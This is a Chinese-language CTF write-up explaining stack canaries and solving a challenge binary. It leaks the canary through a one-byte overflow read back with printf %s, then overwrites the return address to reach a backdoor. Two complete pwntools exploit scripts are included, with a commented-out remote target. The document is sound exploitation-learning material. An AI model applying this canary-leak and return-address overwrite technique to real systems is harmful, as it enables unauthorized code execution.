只有一个vuln文件,先看elf和保护
文件还是一样的64位,lsb,elf文件
但是checksec显示==🔴Canary found==,说明添加了canary(栈金丝雀)保护
# canary(栈金丝雀)
其实很简单,canary就是储存在栈上的一段数据,那他是怎么起到对栈溢出的保护效果的呢?
在有canary的程序中,在函数开头会有类似这样的语句
```c
unsigned __int64 v4; // [rsp+78h] [rbp-8h]
v4 = __readfsqword(0x28u);
```
这里的v4就是canary啦,`__readfsqword`函数的作用是从FS 段寄存器指定的内存位置读取一个 8 字节的词,而0x28u就是存了这个随机的canary的地址
对应的汇编代码如下
```asm
var_74= dword ptr -74h
buf= byte ptr -70h
var_8= qword ptr -8  //-8表示与rbp的距离

mov     rbp, rsp
add     rsp, 0FFFFFFFFFFFFFF80h
mov     rax, fs:28h
mov     [rbp+var_8], rax
```
可以看到这里先开辟了一个缓冲区,大小是128B.**注意**,虽然这里是add,但是后面跟的的以f开头的64位有符号整数,代表这个数是个用补码表示的负数,所以依然是sub
然后再将canary放在rbp-8处

> [关于16进制的补码]
> 以上面的`0FFFFFFFFFFFFFF80h`为例子
> 先确定这个数一共有多少位:16位
> 然后是判断正负,看首位:0-8为正,9-f为负    -所以是负数
> 然后按位取反,用16-x即可,比如上面的就是000000000000007fh
> 再+1:0000000000000080h:  绝对值是8\*16=128
> 所以是-128

所以我们可以画出当前的栈

| 栈底         |         |
| ---------- | ------- |
| rdi        |         |
| saved rbp  |         |
| rbp        | rbp     |
| canary\[6] |         |
| canary\[0] | rbp-8   |
| buf\[103]  | rbp-9   |
| buf\[0]    | rbp-112 |
|            |         |
再看看函数末尾的代码,由于反编译的有点问题所以看汇编
```asm
mov     rax, [rbp+var_8]
sub     rax, fs:28h
jz      short locret_401394

//分支跳转
call    .__stack_chk_fail
```
jz指令用来判断ZF（Zero Flag，零标志位:专门用来记录结果是否为零的标志位)是否为零
也就是看看canary是不是被篡改了

综上,如果我们的buf想要溢出到rip,那就一定会覆盖canary的值,函数就会在返回前报错.这个就是canary的作用:来自以前的矿工,用一只金丝雀来判断矿内是不是有危险.好形象的命名

# 尝试得到canary
当然,canary保护也不是万能的,如果我们能拿到canary的值,然后在溢出的时候放进去不就好了

先看看反汇编代码
```c
unsigned __int64 vuln()
{
  int v1; // [rsp+Ch] [rbp-74h]
  int v2; // [rsp+Ch] [rbp-74h]
  char buf[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v4; // [rsp+78h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts(s: "The canary sings beautifully. What do you want to hear it sing?");
  v1 = read(fd: 0, buf, nbytes: 0x100u);
  if ( buf[v1 - 1] == 10 )
    buf[v1 - 1] = 0;
  printf(format: "Canary sings: %s ~\n", buf);
  puts(s: "Anything else you want to hear?");
  v2 = read(fd: 0, buf, nbytes: 0x100u);
  if ( buf[v2 - 1] == 10 )
    buf[v2 - 1] = 0;
  printf(format: "Canary sings: %s ~\n", buf);
  return v4 - __readfsqword(0x28u);
}
```
注意到这里的vuln函数正好有两次输入和输出,想必第一次就是要让我们想办法输出cannary的值
观察这里的输入和输出函数,输出用的是printf+%s,理论上是比较安全的,但是他的输出对象的由我们随意控制的buf
但是这个输入read就不太安全了,可以溢出到rdi去,也会覆盖canary

经过查询,%s的输出逻辑是:在一个字符串结束时,也就是遇到\x00结尾时,才会停下.
在一般情况下,比如用scanf, 直接创建str变量再整体赋值 , 用gets(但这玩意不会限制输入长度,也不安全)的时候,会自动在后面加\x00
但是read不会,所以printf会往下面接着读,把canary也读出来!
理论上直接运行程序输出里面就会有canary,但是我们阐释了一下发现并没有,诶?

再次查询,发现是因为canary的最后一位是\0,所以按照小端序,最后一位会放在buf的最后,正好阻断了输出
那也比较好解决,我们多输入一位不就好了,正好可以覆盖\0,让后面的canary输入出来
```python
from pwn import *
p = process("./vuln")

ret = 0x000000000040101a 
backdoor = 0x401264
buf = 104

payload = flat(
    b'a'*buf,
    b'a',
)

p.recvline()
p.send(payload)
leak = p.recvline()
print(leak)
```
成功输出了canary,我们已经成功大半了

# 第二段拿shell
因为给我的的是一个很长的str,%s在输出完canary以后还不一定会停下来,所以需要我们截取一下
canary的长度是8B,写成py就是`canary = b'\x00'+leak[119:126]`
注意在前面补上被换掉的\0
后面就很简单了,题目放水给了后门函数
完整脚本:
```python
from pwn import *
p = process("./vuln")
#p = remote("forward.vidar.club",31555)

ret = 0x000000000040101a 
backdoor = 0x401264
buf = 104

payload = flat(
    b'a'*buf,
    b'a',
)

p.recvline()
p.send(payload)
leak = p.recvline()
print(leak)
print(leak[119:-3])
canary = b'\x00'+leak[119:126]
canary =u64(canary)
print(hex(canary))

payload = flat(
    b'a'*buf,
    p64(canary),
    b'a'*8,
    p64(ret),
    p64(backdoor)
)

p.send(payload)
p.interactive()
```
记得在跑不通的时候加一个ret补齐一下试试
(ﾉﾟ▽ﾟ)ﾉ




    





